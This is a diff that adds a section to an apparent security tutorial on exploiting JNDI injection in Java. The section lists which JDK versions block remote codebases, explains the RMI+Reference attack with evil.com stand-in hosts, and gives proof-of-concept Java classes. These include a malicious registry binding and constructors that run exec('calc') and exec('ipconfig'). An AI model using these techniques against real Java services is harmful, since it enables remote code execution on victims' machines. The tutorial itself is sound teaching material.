@@ -222,8 +222,126 @@ and this is what's going on in the background:
 ```
 The above code is the implementation of the getURLOrDefaultInitCtx() method in the InitialContext class. When the lookup() method is called, the getURLOrDefaultInitCtx() method is called to get the context. If the URI contains a protocol, the corresponding context will be obtained. If not, the default context will be obtained.
 
-> in the next days i'll complete the rest of the article and how to abuse jndi injection TwT 
-made with love by l3mon <3
+## 0x02 JNDI injection
+
+### Prerequisites & JDK Defense
+
+In order to successfully exploit the JNDI injection vulnerability, an important prerequisite is the JDK version of the current Java environment, and the different attack vectors in JNDI injection and the restricted version numbers of the exploitation methods are a little different.
+
+Here are the defenses of all different versions of the JDK listed:
+
+    After JDK 6u45, 7u21: The default value of java.rmi.server.useCodebaseOnly is set to true. When the value is true, automatic loading of remote class files is disabled, and class files are loaded only from the CLASSPATH and the path specified by the current JVM's java.rmi.server.codebase. Using this property prevents the client VM from dynamically loading classes from other Codebase addresses, increasing the security of the RMI ClassLoader.
+
+    After JDK 6u141, 7u131, 8u121: Added the option com.sun.jndi.rmi.object.trustURLCodebase, the default is false, which prohibits RMI and CORBA protocols from using the remote codebase option, so RMI and CORBA are no longer available on the above JDK versions. This vulnerability is triggered, but JNDI injection attacks can still be performed by specifying the URI as the LDAP protocol.
+
+    After JDK 6u211, 7u201, and 8u191: the option com.sun.jndi.ldap.object.trustURLCodebase has been added. The default value is false, which prohibits the LDAP protocol from using the remote codebase option, and also prohibits the attack method of the LDAP protocol.
+
+Therefore, before we perform JNDI injection, we must know the prerequisite of the JDK version of the current environment. Only the JDK version within the available range can satisfy the prerequisite for our JNDI injection
+
+### RMI attack vector
+### RMI+Reference Utilization Skills 
+JNDI provides a Reference class to represent a reference to an object, which contains the class information and address of the referenced object. 
+
+Because in JNDI, object transfer is either stored by serialization (copy of object, corresponding to pass by value) or by reference (reference of object, corresponding to pass by reference). When serialization is not easy to use, We can use Reference to store objects in the JNDI system. 
+so inorder to exploit the JNDI injection vulnerability we need to : 
+- bind the malicious Reference class in the RMI registry, where the malicious reference points to the remote malicious class file, when the user can control it outside the lookup() function parameter of the JNDI client or outside the classFactoryLocation parameter of the Reference class constructor. When the control is performed, the user's JNDI client will access the malicious Reference class bound in the RMI registry, thereby loading the malicious class file on the remote server and executing it locally on the client, finally realizing the JNDI injection attack and leading to remote code execution . 
+
+Let's look at an example, taking the external controllable parameters of the lookup() function as an example, the attack principle is as follows: 
+
+![jndi](/home/Downloads/6.png)
+
+    1 - The attacker triggers dynamic envi  ronment conversion through controllable URI parameters, for example, the URI here is rmi://evil.com:1099/refObj；
+    2 - The previously configured context rmi://localhost:1099will be pointed to due to dynamic context conversion rmi://evil.com:1099/；
+    3 - apply to go rmi://evil.com:1099request binding object refObj, the RMI service prepared by the attacker in advance will return with the name refObjThe ReferenceWrapper object you want to bind ( Reference("EvilObject", "EvilObject", "http://evil-cb.com/")）；
+    4 - App gets ReferenceWrapperobject starts from local CLASSPATHsearch in EvilObjectclass, if it does not exist it will be retrieved from http://evil-cb.com/go up and try to get EvilObject.class, that is, to dynamically acquire http://evil-cb.com/EvilObject.class；
+    5 - The attacker's pre-prepared service returns a compiled file containing malicious code. EvilObject.class；
+    6 - The application starts calling EvilObjectThe constructor of the class, because the attacker defines the constructor in advance, the malicious code contained in it is executed;
+
+
+The code is as follows. Of course, you need to pay attention to the impact of the JDK version.
+JNDIClient.java, lookup() function parameters are externally controllable: 
+
+```java
+public  class  JNDIClient  { 
+    public  static  void  main (String[] args)  throws  Exception  { 
+        if (args.length <  1 ) { 
+            System.out.println( "Usage: java JNDIClient <uri>" ); 
+            System.exit(- 1 ); 
+        } 
+        String uri = args[ 0 ]; 
+        Context ctx =  new  InitialContext(); 
+        System.out.println( "Using lookup() to fetch object with "  + uri); 
+        ctx.lookup(uri); 
+    } 
+} 
+```
+EvilObject.java, the purpose is to play the role of malicious code: 
+
+```java 
+public  class  EvilObject  implements  Serializable  { 
+    public  EvilObject ()  throws  Exception  { 
+        System.out.println( "EvilObject constructor called" ); 
+        Runtime.getRuntime().exec( "calc" ); 
+    } 
+} 
+```
+RMIService.java, if the object instance can be successfully bound to the RMI service, it must directly or indirectly implement the Remote interface. Here, ReferenceWrapper inherits from the UnicastRemoteObject class and implements the Remote interface:   
+```java
+public  class  RMIService  { 
+    public  static  void  main (String args[])  throws  Exception  { 
+        Registry registry = LocateRegistry.createRegistry( 1099 ); 
+        Reference refObj =  new  Reference( "EvilObject" ,  "EvilObject" ,  "http://127.0.0.1:8080/" ); 
+        ReferenceWrapper refObjWrapper =  new  ReferenceWrapper(refObj); 
+        System.out.println( "Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/refObj'" ); 
+        registry.bind( "refObj" , refObjWrapper); 
+    } 
+} 
+```
+
+Here, RMIService.java and JNDIClient.java are placed in the same directory, and EvilObject.java is placed in another directory (to prevent the application side from instantiating the EvilObject object during the reappearance of the vulnerability, find the compiled bytes from the current path of the CLASSPATH code, without going to the remote end to download), compile these three files, and execute commands in different windows, and finally successfully implement JNDI injection through RMI+Reference:
+
+![jndi](/home/Downloads/7.png)
+
+> Vulnerability point 1 - lookup parameter injection
+
+When the parameters of the lookup() function of the JNDI client are controllable, that is, the URI is controllable, according to the principle of dynamic conversion of the JNDI protocol, the attacker can pass in a malicious URI address to point to the attacker's RMI registry service, so that the victim client can load A malicious class bound to the attacker's RMI registry service, enabling remote code execution.
+
+The following takes the RMI service as an example. The principle is the same as the previous summary. The local JDK version is 1.8.0_73.
+
+AClient.java is a JNDI client. The original context has been set to connect to the local RMI registry service on port 1099 by default. At the same time, the program allows the user to enter the URI address to dynamically convert the JNDI access address, that is, the lookup() function here. Parameters can be controlled: 
+
+```java
+public  class  AClient  { 
+    public  static  void  main (String[] args)  throws  Exception  { 
+        Properties env =  new  Properties(); 
+        env.put(Context.INITIAL_CONTEXT_FACTORY,  "com.sun.jndi.rmi.registry.RegistryContextFactory" ); 
+        env.put(Context.PROVIDER_URL,  "rmi://127.0.0.1:1099" ); 
+        Context ctx =  new  InitialContext(env); 
+        String uri =  "" ; 
+        if (args.length ==  1 ) { 
+            uri = args[ 0 ]; 
+            System.out.println( "[*]Using lookup() to fetch object with "  + uri); 
+            ctx.lookup(uri); 
+        }  else  { 
+            System.out.println( "[*]Using lookup() to fetch object with rmi://127.0.0.1:1099/demo" ); 
+            ctx.lookup( "demo" ); 
+        } 
+    } 
+} 
+```
+Finally, write a malicious EvilClassFactory class, the goal is to execute the ipconfig command on the client, compile it into a class file and place it in the same directory as AServer: 
+
+```java
+public  class  EvilClassFactory  implements  ObjectFactory  { 
+    public  Object getObjectInstance (Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment)  throws  Exception  { 
+        Runtime.getRuntime().exec( "ipconfig" ); 
+        return  null ; 
+    } 
+} 
+```
+
+>> to be continued ...
+
 
 
 
